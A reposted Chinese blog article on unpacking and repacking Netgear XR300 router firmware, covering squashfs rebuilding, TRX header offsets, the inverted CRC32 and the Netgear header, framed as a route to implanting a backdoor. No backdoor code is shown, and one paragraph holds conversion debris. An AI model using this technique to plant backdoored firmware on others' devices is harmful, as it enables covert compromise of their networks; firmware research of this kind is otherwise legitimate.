<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /> 
    <title>Netgear固件分析与后门植入 - Golang编程语言知识介绍</title>
    <meta name="keywords" content="git,Git,Lua,lua,Golang,go">
    
    <meta property="og:title" content="Netgear固件分析与后门植入">
    <meta property="og:site_name" content="Golang编程语言知识介绍">
    <meta property="og:image" content="/img/author.jpg"> 
    <meta name="title" content="Netgear固件分析与后门植入 - Golang编程语言知识介绍" />
    <meta name="description" content="愿星光伴你左右"> 
    <link rel="shortcut icon" href="http://shanks.link/img/favicon.ico" />
    <link rel="apple-touch-icon" href="http://shanks.link/img/apple-touch-icon.png" />
    <link rel="apple-touch-icon-precomposed" href="http://shanks.link/img/apple-touch-icon.png" />
    <link href="http://shanks.link/js/vendor/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
    <link href="http://shanks.link/js/vendor/fancybox/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
    <link href="http://shanks.link/css/main.css" rel="stylesheet" type="text/css" />
    <link href="http://shanks.link/css/syntax.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
     fancybox: true, 
    motion: true
  };
</script>
</head>
<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
<div class="container one-collumn sidebar-position-left page-home  ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"> <div class="site-meta  custom-logo ">

  <div class="custom-logo-site-title">
    <a href="http://shanks.link/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Golang编程语言知识介绍</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
    <ul id="menu" class="menu">
      
      
        <li class="menu-item ">
          <a href="http://shanks.link/post/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/todo/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />todo
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/thinking/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />思考
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/life/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />life
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/food/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />food
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/os/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />OS
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/lua/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />lua
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/redis/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />redis
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/go/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Golang
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/c/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />C
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/tcpip/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />TCP/IP
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/ebpf/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />ebpf
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/p4/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />p4
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/openvpn/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />OpenVPN
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/ipsec/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />IPSec
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/l2tp/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />L2TP
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/dns/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />DNS
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/distributed/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />distributed
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/web/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />web
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/openwrt/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />OpenWRT
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/%E8%BF%90%E7%BB%B4/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />运维
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/git/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />Git
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/%E9%B8%9F%E5%93%A5%E7%9A%84%E7%A7%81%E6%88%BF%E8%8F%9C/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />鸟哥的私房菜
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/it/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />IT杂谈
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/categories/finance/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />投资
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/about/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />About Me
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/links/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />友情链接
          </a>
        </li>
      
        <li class="menu-item ">
          <a href="http://shanks.link/ftp/" rel="section">
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />FTP
          </a>
        </li>
      
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger"> <i class="menu-item-icon fa fa-search fa-fw"></i> <br /> 搜索</a>
      </li>
    </ul>
    <div class="site-search">
      <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>

    </div>
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
<section id="posts" class="posts-expand">
  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <header class="post-header">
      <h1 class="post-title" itemprop="name headline">
        <a class="post-title-link" href="http://shanks.link/blog/2023/04/26/netgear%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" itemprop="url">
        Netgear固件分析与后门植入
        </a>
      </h1>
      <div class="post-meta">
      <span class="post-time">
<span class="post-meta-item-icon">
    <i class="fa fa-calendar-o"></i>
</span>
<span class="post-meta-item-text">时间：</span>
<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2023-04-26">
    2023-04-26
</time>
</span> 
      

  <span class="post-category" >
  &nbsp; | &nbsp;
  <span class="post-meta-item-icon">
    <i class="fa fa-folder-o"></i>
  </span>
  <span class="post-meta-item-text">分类：</span>
  
    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
      <a href="http://shanks.link/categories/openwrt" itemprop="url" rel="index">
        <span itemprop="name">OpenWrt</span>
      </a>
      &nbsp; 
    </span>
  
</span>


       <span>
&nbsp; | &nbsp;
<span class="post-meta-item-icon">
    <i class="fa fa-eye"></i>
</span>
<span class="post-meta-item-text">阅读：</span>
<span class="leancloud-visitors-count">6031 字 ~13分钟</span>
</span>
      </div>
    </header>
    <div class="post-body" itemprop="articleBody">
    <p><a href="https://www.secpulse.com/archives/160480.html">以下内容转载自</a></p>
<p>记录对netgear XR300路由器固件分析以及重新打包过程</p>
<p>文章亮点就是 全方面的讲解了固件重打包的流程，从怎么分析到实际操作都进行了讲解，并且根据固件的分层结构，详细介绍了每层数据的具体处理方法</p>
<h1 id="资源">资源</h1>
<h2 id="硬件">硬件</h2>
<ul>
<li>一台 netgear XR300路由器</li>
</ul>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142734.png" alt="img"></p>
<ul>
<li>网线</li>
</ul>
<h2 id="软件">软件</h2>
<ul>
<li>固件下载地址</li>
<li>官方打包工具源码地址</li>
</ul>
<h3 id="交叉编译环境">交叉编译环境</h3>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">Note: 
      This <span style="color:#00f">package</span> has been built successfully on 32-bit i386 Fedora 6 Linux 
      host machine. Compiling this <span style="color:#00f">package</span> on platforms other than Fedora Core 6
      may have unexpected results.
</code></pre></div><p>根据官方源码中的说明，配置好32位 i386 Fedora 6虚拟机</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[root@localhost]# uname -a
Linux localhost.localdomain 2.6.22.14-72.fc6 #1 SMP Wed Nov 21 13:44:07 EST 2007 i686 i686 i386 GNU/Linux
</code></pre></div><p>下载交叉编译工具 arm-uclibc 工具链</p>
<h1 id="使用binwalk解析固件">使用binwalk解析固件</h1>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ binwalk XR300-V1.0.2.24_10.3.21.chk 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58            0x3A            TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x0
86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
</code></pre></div><p>通过分析binwalk解析结果，可以看到固件由netgear header(0x3A字节) +TRX header(0x1c字节)+linux kernel+squashfs文件系统构成。接下来由从内到外的顺序对每一个部分进行详细分析</p>
<h2 id="squashfs">Squashfs</h2>
<p>首先固件最内层是一个squash文件系统，从binwalk解析结果可以看到对文件系统版本以及大小等属性的详细描述</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
</code></pre></div><p>目前网上针对squashfs的打包工作都是使用开源的mksquash这个程序进行打包，使用binwalk解析出来的压缩参数进行压缩后与原本的固件进行对比</p>
<ul>
<li>原本文件系统：</li>
</ul>
<p>文件开头：</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142735.png" alt="img"></p>
<p>文件结尾：</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142736.png" alt="img"></p>
<ul>
<li>重打包文件系统：</li>
</ul>
<p>文件开头：</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-16231427361.png" alt="img"></p>
<p>文件结尾：</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142738.png" alt="img"></p>
<p>可以看到不管是开头还是结尾都有明显差异，原本文件系统在结尾处有明显英文的信息描述，所以使用网上方法直接对文件系统进行打包是不行的（事实证明，这种方法的确会让路由器变砖）</p>
<h3 id="使用官方代码构建文件系统">使用官方代码构建文件系统</h3>
<p>因为已经有了官方打包的源码，所以我选择直接运行官方的构建固件代码，但是在编译运行的时候出现了很多报错，可能是我选择的Linux版本的问题，在修复了几个报错的文件后仍然会出现新的报错，所以我暂时放弃了这个做法。
因为官方代码编译运行是依据 src/router/Makefile 这个文件，所以我选择直接分析这个文件，文件比较大，我从头到尾把这个MakeFile读了一遍，基本就了解了netgear固件打包的全流程，这个部分只分析与squash文件系统相关的地方。</p>
<p>在MakeFile中和构建squash文件系统相关的语句如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ifeq ($(CONFIG_SQUASHFS), y)
ifeq (2_6_36,$(LINUX_VERSION))
    $(MAKE) -C squashfs-4.2 mksquashfs
    find $(TARGETDIR) -name &#34;.svn&#34; | xargs rm -rf
    squashfs-4.2/mksquashfs $(TARGETDIR) $(PLATFORMDIR)/$(ROOT_IMG) -noappend -all-root
</code></pre></div><p>首先是在squashfs-4.2 目录下执行Make命令，然后删除所有.svn文件，最后执行mksquashfs命令，其中</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PLATFORM := $(PLT)-uclibc
export PLATFORMDIR := $(TOP)/$(PLATFORM)
export TARGETDIR := $(PLATFORMDIR)/target
</code></pre></div><p>最终我们要选择我们构建好后门的文件系统文件夹</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142739.png" alt="img"></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./mksquashfs squashfs-root/ target.squashfs -noappend -all-root
</code></pre></div><p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142740.png" alt="img"></p>
<p>这里需要注意的是，(TARGETDIR)是文件系统目录¨G5G最终我们要选择我们构建好后门的文件系统文件夹<img src="https://ppplutoboke.oss%E2%88%92cn%E2%88%92beijing.aliyuncs.com/20210324204807.png" alt="">¨G6G<img src="https://ppplutoboke.oss%E2%88%92cn%E2%88%92beijing.aliyuncs.com/20210324204839.png" alt="">这里需要注意的是，(TARGETDIR)参数要使用原来固件解析出的文件系统文件夹，src文件夹中的文件系统缺少文件会导致web等服务无法启动</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142741.png" alt="img"></p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142742.png" alt="img"></p>
<p>新生成的文件系统和binwalk解出来的不管是开头还是结尾都很相似了，是可以使用的。</p>
<h2 id="linux-kernel">linux kernel</h2>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">86      0x56     LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
</code></pre></div><p>从binwalk解析结果来看，文件系统上面是Linux内核,接下来介绍几种常见的Linux内核文件</p>
<h3 id="initrdimgvmlinux和-vmlinuz">initrd.img、vmlinux和 vmlinuz</h3>
<p>initrd.img是一个小的映象，包含一个最小的linux系统。通常的步骤是先启动内核，然后内核挂载initrd.img，并执行里面的脚本来进一步挂载各种各样的模块，然后发现真正的root分区，挂载并执行/sbin/init…</p>
<p>initrd.img当然是可选的了，如果没有initrd.img,内核就试图直接挂载root分区。</p>
<p>说 initrd.img文件还会提到另外一个名角&mdash;vmlinuz。vmlinuz是可引导的、压缩的内核。“vm”代表 “Virtual Memory”。Linux 支持虚拟内存，不像老的操作系统比如DOS有640KB内存的限制。Linux能够使用硬盘空间作为虚拟内存，因此得名“vm”。另外：vmlinux是未压缩的内核，vmlinuz是vmlinux的压缩文件。</p>
<h3 id="为什么要initrdimg">为什么要initrd.img？</h3>
<p>系统内核vmlinuz被加载到内存后开始提供底层支持，在内核的支持下各种模块，服务等被加载运行。这样当然是大家最容易接受的方式，曾经的linux就是这样的运行的。假设你的硬盘是scsi 接口而你的内核又不支持这种接口时，你的内核就没有办法访问硬盘，当然也没法加载硬盘上的文件系统，怎么办？把内核加入scsi驱动源码然后重新编译出一个新的内核文件替换原来vmlinuz。</p>
<p>vmlinuz是可引导的、压缩的内核。“vm”代表“Virtual Memory”。Linux 支持虚拟内存，不像老的操作系统比如DOS有640KB内存的限制。Linux能够使用硬盘空间作为虚拟内存，因此得名“vm”。vmlinuz是可执行的Linux内核，它位于/boot/vmlinuz，它一般是一个软链接，比如图中是vmlinuz-2.4.7-10的软链接。</p>
<p>vmlinuz的建立有两种方式。一是编译内核时通过“make zImage”创建，然后通过：
“cp /usr/src/linux-2.4/arch/i386/linux/boot/zImage /boot/vmlinuz”产生。zImage适用于小内核的情况，它的存在是为了向后的兼容性。二是内核编译时通过命令make bzImage创建，然后通过：“cp /usr/src/linux-2.4/arch/i386/linux/boot/bzImage /boot/vmlinuz”产生。bzImage是压缩的内核映像，需要注意，bzImage不是用bzip2压缩的，bzImage中的bz容易引起 误解，bz表示“big zImage”。bzImage中的b是“big”意思。
zImage（vmlinuz）和bzImage（vmlinuz）都是用gzip压缩的。它们不仅是一个压缩文件，而且在这两个文件的开头部分内嵌有gzip解压缩代码。所以你不能用gunzip 或 gzip –dc解包vmlinuz。
内核文件中包含一个微型的gzip用于解压缩内核并引导它。两者的不同之处在于，老的zImage解压缩内核到低端内存（第一个640K）， bzImage解压缩内核到高端内存（1M以上）。如果内核比较小，那么可以采用zImage 或bzImage之一，两种方式引导的系统运行时是相同的。大的内核采用bzImage，不能采用zImage。</p>
<h3 id="提取linux-kernel">提取Linux kernel</h3>
<p>在makefile中针对linux kernel的命令主要有以下几条：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">linux_kernel:        
ifeq ($(LINUXDIR), $(BASEDIR)/components/opensource/linux/linux-2.6.36)
    $(MAKE) -C $(LINUXDIR) zImage
    $(MAKE) CONFIG_SQUASHFS=$(CONFIG_SQUASHFS) -C $(SRCBASE)/router/compressed
</code></pre></div><p>可以发现源码中已经有了官方编译好的内核可以直接使用，或者也可以直接将固件中这一部分提取出来直接使用</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142744.png" alt="img"></p>
<h2 id="trx-header">TRX header</h2>
<p>接下来是对TRX头进行分析</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">58    0x3A    TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x0
</code></pre></div><p>从binwalk解析结果来看，TRX头是对linux kernel和squashfs的拼接和校验</p>
<p>在我使用的固件中TRX内容如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F

00000030                                  48 44 52 30 00 F0             HDR0 ?
00000040   E2 01 C3 75 71 F9 00 00  01 00 1C 00 00 00 60 E5   ?胾q?       `?
00000050   21 00 00 00 00 00                                  !     
</code></pre></div><p>TRX是某些路由器（如linksys）和开源固件（如OpenWRT和DD-WRT）中使用的内核映像文件的格式。</p>
<p>TRX文件头格式如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">struct trx_header {
    uint32_t magic;     /* &#34;HDR0&#34; */
    uint32_t len;       /* Length of file including header */
    uint32_t crc32;     /* 32-bit CRC from flag_version to end of file */
    uint32_t flag_version;  /* 0:15 flags, 16:31 version */
    uint32_t offsets[4];    /* Offsets of partitions from start of header */
};
</code></pre></div><ul>
<li>0x3A-0x3D magic魔数</li>
<li>0x3E-0x41 image size</li>
<li>0x42-0x45 CRC value</li>
<li>0x46-0x47 TRX_flag</li>
<li>0x48-0x49 TRX_version</li>
<li>0x4A-0x55 分区偏移量:loader 偏移: 0x1C, linux kernel 偏移: 0x21E560, rootfs 偏移: 0x0</li>
</ul>
<p>官方打包代码中已经有trx工具可以直接使用，在MakeFile中针对trx头使用的命令如下，可以看到其实就是对之前生成的vmlinuz文件和squash文件做一个组装</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trx -o $(PLATFORMDIR)/linux.trx $(PLATFORMDIR)/vmlinuz $(PLATFORMDIR)/$(ROOT_IMG) ; 
</code></pre></div><p>在虚拟机中运行以下的命令，可得到相应的加了trx头的文件</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ./trx -o ./linux.trx vmlinuz target.squashfs                  
append nvram file target.squashfs
append nvram 33751040 bytes
$ binwalk linux.trx                  

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x42E58DB3, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x0, rootfs offset: 0x2030000
28            0x1C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
2168220       0x21159C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750709 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2021-03-24 06:51:29


$ binwalk XR300-V1.0.2.24_10.3.21.chk 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58            0x3A            TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x0
86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
</code></pre></div><p>使用binwalk对比原本的固件以及生成的trx文件可以发现在TRX头部分除了CRC32不一样外，偏移部分也存在较大差异，CRC32不一样是正常的，偏移部分差异过大肯定存在问题。
通过将偏移数值与binwalk解析结果对比分析，可以发现使用trx工具生成的TRX文件将linux kernel和squashfs的偏移搞反了，为了印证我的猜想，我对TRX工具进行了逆向</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-16231427441.png" alt="img"></p>
<p>可以看到这里反汇编出来的逻辑与原始固件中TRX头所表现出来的肯定是不一样的， 为了与原固件保持一致需要在TRX生成的文件基础上做一些调整，具体调整方式如下：</p>
<ul>
<li>将trx文件中0x18 - 0x1b也就是rootfs对应的偏移改为0</li>
<li>将trx文件中0x14 - 0x17也就是linux kernel对应的偏移改为0x21159C，这是因为使用的就是原始固件中的linux kernel所以这里的偏移与原固件保持一致，如果修改了内核文件导致与原始内核大小不一致，这里需要变成修改后的偏移</li>
<li>重新计算CRC32</li>
</ul>
<h3 id="计算crc32">计算CRC32</h3>
<p>以XR300-V1.0.2.24_10.3.21.chk文件为例，CRC32校验值为0x3DB7DE14，根据TRX定义，这里的CRC32校验是计算从flag部分到文件结尾，使用winhex计算该部分校验值</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142745.png" alt="img"></p>
<p>发现与固件中的值不符合，这里其实是做了一个取反操作</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142746.png" alt="img"></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&gt;&gt;&gt; bin(0x3DB7DE14)
&#39;0b111101101101111101111000010100&#39;
&gt;&gt;&gt; bin(0xC24821EB)
&#39;0b11000010010010000010000111101011&#39;
</code></pre></div><p>所以在修改完TRX偏移部分后，计算出CRC32校验，取反之后修改CRC32部分即可
在线取反工具</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ binwalk linux.trx                                                                            

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x16**65F4, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x0
28            0x1C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
2168220       0x21159C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750709 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2021-03-24 06:51:29
</code></pre></div><h2 id="netgear-header">netgear header</h2>
<p>最后一个部分就是针对netgear header的构建，前0x3A字节是netgear自带的header,</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F

00000000   2A 23 24 5E 00 00 00 3A  01 01 00 03 1A 0A 03 16   *#$^   :        
00000010   C2 70 61 44 00 00 00 00  02 24 20 00 00 00 00 00   聀aD     $      
00000020   C2 70 61 44 F1 AC 09 FF  55 31 32 48 33 33 32 54   聀aD瘳 U12H332T
00000030   37 38 5F 4E 45 54 47 45  41 52                     78_NETGEAR
</code></pre></div><p>通过查看R7000，XR300的多个版本chk文件，0-8字节是不变的，从9字节开始是固件的版本号。</p>
<ul>
<li>0x9-0x10字节是固件的版本号，对应着文件名。</li>
<li>0x10-0x17,0x20-0x27 是netgear的chencksum信息，具体介绍在后面说明</li>
<li>0x18-0x1F是固件大小，每一个chk文件大小都以0x3A结尾，所以文件大小信息的0x3A存放在0x7的位置。</li>
<li>0x28-0x39字节是固件的种类信息，比如同一系列R7000，这12字节就是相同的。</li>
</ul>
<p>在Makefile中针对这一部分的命令如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">###########################################
### Create .chk files for Web UI upgrade ##
cd $(PLATFORMDIR) &amp;&amp; touch rootfs &amp;&amp; 
../../../tools/packet -k linux.trx -f rootfs -b $(BOARDID_FILE) 
-ok kernel_image -oall kernel_rootfs_image -or rootfs_image 
-i $(fw_cfg_file) &amp;&amp; 
rm -f rootfs &amp;&amp; 
cp kernel_rootfs_image.chk $(FW_NAME)_`date +%m%d%H%M`.chk
</code></pre></div><p>这里的操作逻辑是先创建一个空的rootfs文件然后使用packet程序对上面生成的linux.trx文件添加header，完整命令如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ./packet -k linux.trx -b compatible_xr300.txt -ok kernel -oall image -or rootfs -i ambitCfg.h
</code></pre></div><p>-b -i 的参数都可以在源码文件夹中找到
生成的image.chk就是最终的完整固件</p>
<p>重打包工作到这里其实就已经结束了，但是我对packet工具进行了进一步分析</p>
<h3 id="逆向packet">逆向packet</h3>
<p>因为不是很了解packet参数对应的具体含义，所以我使用IDA对packet进行了逆向</p>
<p>程序的逻辑是先通过程序参数输入对要使用的文件名变量进行赋值，然后通过 <strong>-i [configure file path/name]</strong> 获得的cfg文件提取出固件的版本信息，这个文件对应的就是 <strong>ambitCfg.h</strong> 查看文件内容，可以看到文件中定于了固件版本</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/*formal version control*/

#define AMBIT_HARDWARE_VERSION     &#34;U12H240T00&#34;

